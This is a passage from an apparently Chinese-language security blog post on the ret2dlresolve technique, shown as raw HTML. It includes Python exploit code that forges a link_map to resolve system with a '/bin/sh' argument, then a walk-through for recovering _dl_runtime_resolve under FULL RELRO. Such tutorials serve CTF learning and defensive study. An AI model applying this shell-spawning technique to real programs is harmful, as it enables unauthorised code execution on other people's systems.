</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676">**</span><span style="color:#4C9A91">64</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><span style="color:#758575DD">  # r_offset</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">:</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">28</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">38</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 6</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">40</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> known_func_ptr </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">48</span><span style="color:#666666">:</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">68</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> fake_linkmap_addr</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">70</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> rela_addr </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><span style="color:#758575DD">  # r_info</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">f8</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> fake_linkmap_addr </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 8</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    resolve_call </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">plt0</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">fake_linkmap_addr</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">linkmap</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> resolve_call</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">fake_linkmap</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> resolve_call </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> construct_linkmap</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">bss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">got</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">read</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">read</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>然后控制程序执行流去调用 <code class="inline-code">_dl_resolve(fake_linkmap, 0)</code> 即可。</p>
<p>另外也可以构造下图的这种：</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/68f7bf0f3203f7be0089b85a.png" alt="复用 got 表"/></p>
<p>此时(假设为64位)的 <code class="inline-code">Elf_Sym</code> 中的 <code class="inline-code">st_name</code> 和 <code class="inline-code">st_other</code> 字段将与 func B` 的上一个 GOT 表项重合， 可能更省字节一点 <del>但是感觉没什么必要</del></p>
<h3 id="full-relro" class="scroll-target"><a href="#full-relro"><code class="hash inline-code">#</code>FULL RELRO</a></h3>
<p>此时 <code class="inline-code">.got.plt</code> 表中的第二项表项 <code class="inline-code">GOT[1]</code> 装载的 <code class="inline-code">link_map</code> 地址以及第三项表项 <code class="inline-code">GOT[2]</code> 装载的<code class="inline-code">dl_runtime_resolve</code> 函数地址将是 0。</p>
<p>读取各类数据结构寻回 <code class="inline-code">_dl_runtime_resolve</code> 的值以及 <code class="inline-code">link_map</code> 的值即可。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#A0ADA0">/* offset    |  size */</span><span style="color:#393A34">  type </span><span style="color:#999999">=</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> r_debug </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#A0ADA0">/*    0      |     4 */</span><span style="color:#AB5959">    int</span><span style="color:#393A34"> r_version</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">/* XXX  4-byte hole  */</span><br><span style="color:#A0ADA0">/*    8      |     8 */</span><span style="color:#AB5959">    struct</span><span style="color:#393A34"> link_map_public </span><span style="color:#AB5959">*</span><span style="color:#393A34">r_map</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">/*   16      |     8 */</span><span style="color:#393A34">    Elf64_Addr r_brk</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">/*   24      |     4 */</span><span style="color:#AB5959">    enum</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#393A34">RT_CONSISTENT</span><span style="color:#999999">,</span><span style="color:#393A34"> RT_ADD</span><span style="color:#999999">,</span><span style="color:#393A34"> RT_DELETE</span><span style="color:#1e754f">}</span><span style="color:#393A34"> r_state</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">/* XXX  4-byte hole  */</span><br><span style="color:#A0ADA0">/*   32      |     8 */</span><span style="color:#393A34">    Elf64_Addr r_ldbase</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#758575DD">/* offset    |  size */</span><span style="color:#DBD7CAEE">  type </span><span style="color:#666666">=</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> r_debug </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#758575DD">/*    0      |     4 */</span><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> r_version</span><span style="color:#666666">;</span><br><span style="color:#758575DD">/* XXX  4-byte hole  */</span><br><span style="color:#758575DD">/*    8      |     8 */</span><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> link_map_public </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">r_map</span><span style="color:#666666">;</span><br><span style="color:#758575DD">/*   16      |     8 */</span><span style="color:#DBD7CAEE">    Elf64_Addr r_brk</span><span style="color:#666666">;</span><br><span style="color:#758575DD">/*   24      |     4 */</span><span style="color:#CB7676">    enum</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">RT_CONSISTENT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> RT_ADD</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> RT_DELETE</span><span style="color:#4d9375">}</span><span style="color:#DBD7CAEE"> r_state</span><span style="color:#666666">;</span><br><span style="color:#758575DD">/* XXX  4-byte hole  */</span><br><span style="color:#758575DD">/*   32      |     8 */</span><span style="color:#DBD7CAEE">    Elf64_Addr r_ldbase</span><br></code></pre></div>
<p>这个 <code class="inline-code">r_map</code> 就是 <code class="inline-code">linkmap</code> 的地址，而 <code class="inline-code">dl_runtime_resolve</code> 地址可以通过其他 <code class="inline-code">linkmap</code> 的 got 表找。</p>
<p>寻找的逻辑链如下：</p>
<ol>
<li>读取 <code class="inline-code">.dynamic</code> 段中以 <code class="inline-code">DT_DEBUG</code> 符号为关键字的值，即得到 <code class="inline-code">r_debug</code> 的地址；</li>
<li>从 <code class="inline-code">r_debug</code> 结构体中读出 <code class="inline-code">r_map</code> 的值，即 <code class="inline-code">link_map</code> 地址；</li>
<li>从 <code class="inline-code">link_map</code> 结构体中读出的 <code class="inline-code">l_next</code> 的值，遍历 <code class="inline-code">link_map</code> 链表；</li>
<li>读取每个 <code class="inline-code">link_map</code> 中的<code class="inline-code">l_info[DT_PLTGOT]</code>的值，判断该值是否为 0，若不为 0 则认为是未开启 FULL RELRO 的 so 文件，即存在 .got.plt 表，此时应读出该 <code class="inline-code">l_info[DT_PLTGOT]</code> 的值，得到该 <code class="inline-code">so</code> 文件的 <code class="inline-code">Elf_Dyn(DT_PLTGOT)</code> 结构体的地址；</li>
<li>从 <code class="inline-code">Elf_Dyn(DT_PLTGOT)</code> 结构体中读出 <code class="inline-code">.got.plt</code> 节的基址；</li>
<li>然后读出第三个表项即 <code class="inline-code">.got.plt[2]</code> 的值，该值即为 <code class="inline-code">_dl_runtime_resolve</code> 的地址。</li>
</ol>
<p>然后当 Partial RELRO 打就可以了。</p>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>参考题目</a></h2>
<p>todo.</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>